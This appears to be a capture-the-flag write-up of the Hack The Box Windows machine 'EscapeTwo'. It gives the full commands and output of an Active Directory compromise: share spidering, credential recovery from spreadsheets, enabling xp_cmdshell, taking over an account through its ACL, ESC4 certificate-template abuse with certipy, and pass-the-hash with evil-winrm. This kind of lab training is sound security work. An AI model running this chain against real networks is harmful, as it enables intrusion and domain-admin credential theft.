---
title: "EscapeTwo"
date: 30-07-2025
categories: [HTB, Windows, Windows Easy]
tags: [AD, Certipy, Bloodhound, ACL, ESC4]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d5fcf2425893a73cf137284e2de580e1.png
---

EscapeTwo is an easy assumed breached Active Directory machine. We are provided credentials for the user Rose which has access to the Accounting Department share which contains two spreadsheet files which are corrupted, after fixing these files, it can be seen that one of them contains credentials for some users. One of these users has admin rights to the MSSql server which can execute commands. After getting a reverse shell we can read files inside of the server. One of the config files for the MSSql server contains credentials for the svc_sql user but this password has been reused by the user ryan which can change the ownership of the ca_svc user. This user can use ESC4 on a vulnerable certificate template to gain the NTLM hash of the Administrator user. 

![escape_info_card](/assets/images/escapetwo/EscapeTwo.png)

## NMAP Scan

As always we can start with an nmap scan to show which ports this machine has open. 

```
# Nmap 7.94SVN scan initiated Wed Jul 30 11:57:19 2025 as: nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269 -Pn -oN nmap/escapetwo 10.10.11.51
Nmap scan report for 10.10.11.51
Host is up (0.070s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-30 09:57:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T09:58:47+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-07-30T09:58:47+00:00; +2s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-30T09:55:16
|_Not valid after:  2055-07-30T09:55:16
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-07-30T09:58:47+00:00; +2s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T09:58:47+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-30T09:58:47+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-30T09:58:09
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 30 11:58:46 2025 -- 1 IP address (1 host up) scanned in 87.31 seconds
```

From the output we can determine that this is a domain controller in an Active Directory network as it has the stereotypical ports open. The one thing to note is that port 1433 is open, which corresponds to Microsoft's SQL server. The nmap scan also gave us the domain name of the box which is `sequel.htb` I recommend adding the following entry to your `/etc/hosts` file as it will solve a lot of the DNS resolution conflicts we might get.

```
10.10.11.51 sequel.htb DC01.sequel.htb DC01
```
## Enumerating Shares
Since this is an assumed breach box, we have the credentials for rose which we can use to enumerate ths shares being listed. 

![escape_info_card](/assets/images/escapetwo/shares.png)

We see two non-default shares being hosted; Accounting Department and Users. I used the Spider module to download all the shares to my machine to easily work with them.

```
netexec smb sequel.htb -u rose -p KxEPkKe6R8su --shares -M spider_plus -o DOWNLOAD_FLAG=True
```

## Discovering the Corrupted Spreadsheet Files
After downloading the files we can see that the only shares that contain files are the Accounting Department, SYSVOL and Users. We can discard SYSVOL and Users as they do not contain any interesting files. We are left with the former which has two spreadsheet files. If we try to open these files we see that they are corrupted.

![escape_info_card](/assets/images/escapetwo/corrupted.png)

If we run `file` against these spreadsheets we see that they are listed as ZIP files.

![escape_info_card](/assets/images/escapetwo/files.png)

#### Unzipping the files
I found two ways to read the content inside of the spreadsheets the first one consists of using `unzip` to unzip the spreadsheets before that we must rename the files to .zip instead of .xlxs.

```
mv accounts.xlsx accounts.zip
unzip accounts.zip 
Archive:  accounts.zip
file #1:  bad zipfile offset (local header sig):  0
replace xl/workbook.xml? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
cat xl/sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t>
</si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si>
<t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si>
<t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t>
</si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t>
</si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si>
<si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si>
<t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si>
<si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```
#### Changing the Magic Bytes
The other method consists of fixing the magic bytes in the original file to match the correct xlsx magic bytes. As we can see from the image below the current magic bytes are set to be `50 48 04 03` which represent a zip file. We must change them to be `50 4B 03 04`
![escape_info_card](/assets/images/escapetwo/bytes.png)

We can then use `hexedit` to change the magic bytes. Once this is done we can open the spreadsheet.

![escape_info_card](/assets/images/escapetwo/creds.png)

We can see that there are now some more credentials, if we pass these credentials to netexec we get a hit for the oscar user. This user does not actually have any more shares or permissions that we could use to further extend our reach on this box.


![escape_info_card](/assets/images/escapetwo/enum.png)
## Getting Admin Access to the MSSql Server
Instead we can use the sa user to login into the MSSql database. It is important to note that we are using a local auth as the sa user does not actually exist on the domain only locally on the DC. Since this account is probably an sql admin we can probably use the `xp_cmdshell` functionality to run commands. Below are the steps needed to activate this function. Note that it did not work first try as the feature was disabled.

```
sqsh -S sequel.htb -U sa -P 'MSSQLP@ssw0rd!' -h
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> xp_cmdshell 'whoami'
2> go
Msg 15281, Level 16, State 1
Server 'DC01\SQLEXPRESS', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system
administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
1> EXECUTE sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
1> RECONFIGURE
2> go
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> RECONFIGURE
2> go
1> xp_cmdshell 'whoami'
2> go
	sequel\sql_svc                                                                                                                                                                                NULL  
```

## Getting a Reverse Shell
To get a shell on this box I used [this site](https://www.revshells.com/) to generate a base64 encoded powershell reverse shell and executed it using `xp_cmdshell`.

![escape_info_card](/assets/images/escapetwo/reverse.png)

## Finding Credentials for More Users
If we go to the root directory of this server we can see a non-default directory called SQL2019, inside of this directory we can see a configuration file that contains some new credentials for the sql_svc service account. Using password spraying we can find that the user ryan is also using the same password.

```
PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
```

Ryan can also winrm into the DC which gives us access to the user flag. From this winrm session we can also run SharpHound to enumerate the ACL's of each user. We could have ran bloodhound form Linux but SharpHound is almost always more complete as the python version tends to skip some ACLs.

![escape_info_card](/assets/images/escapetwo/winrm.png)

After transferring the SharpHound.exe binary over to ryan's desktop we can then execute it and save the data as a zip file using the following command:

```
.\SharpHound.exe -c All --zipfilename sequel.htb
```
## Finding the WriteOwner ACL
Once we have the data we can upload it to bloodhound from where we can view the following ACL.

![escape_info_card](/assets/images/escapetwo/acl.png)

Having WriteOwner over a user gives us the ability to take ownership of that account and change its password. We can do so with the following commands:
1. First we assign our user as a new owner


```
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```
2. Give ourselves full control over the account


```
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250730-194539.bak
[*] DACL modified successfully
```
3. Change the password


```
net rpc password "ca_svc" "password" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "DC01.sequel.htb"
```

## Privilege Escalation
The certificate authority account can have special permissions over different certificate templates which may be vulnerable to exploits. We can use certipy to find these vulnerabilities.

```
certipy find -u ca_svc@sequel.htb -password password -stdout -vuln

Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

We can see that the DunderMifflinAuthentication template is vulnerable to ESC4. I used [ceripy's official walkthrough](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) on how to exploit it. The first step is to update the template to make it vulnerable to ESC1.

```
certipy template -u 'ca_svc@sequel.htb' -p 'password' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication'   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication
```

Then we can request the administrator pfx with the following command. If the command fails I recommend adding more flags like the subject. In the case that we get an error saying that the SIDs do not match I recommend simply removing the SID flag entirely as it still worked without it.

```
certipy req  -u 'ca_svc@sequel.htb' -p 'password'  -dc-ip '10.10.11.51' \
-target 'sequel.htb' -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
-upn 'administrator@sequel.htb' -subject 'CN=Administrator,CN=Users,DC=SEQUEL,DC=HTB'

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with subject: DC=SEQUEL,DC=HTB,CN=Administrator,CN=Users
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Finally to get the NTLM hash we can again use certipy with the following command:
```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.51'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
With the NTLM hash we can start a winrm session to get the root flag:

```
evil-winrm -i sequel.htb -H 7a8d4e04986afa8ed4060f75e5a0b3ff -u Administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ~\Desktop\root.txt
1b764a838<SNIP>
```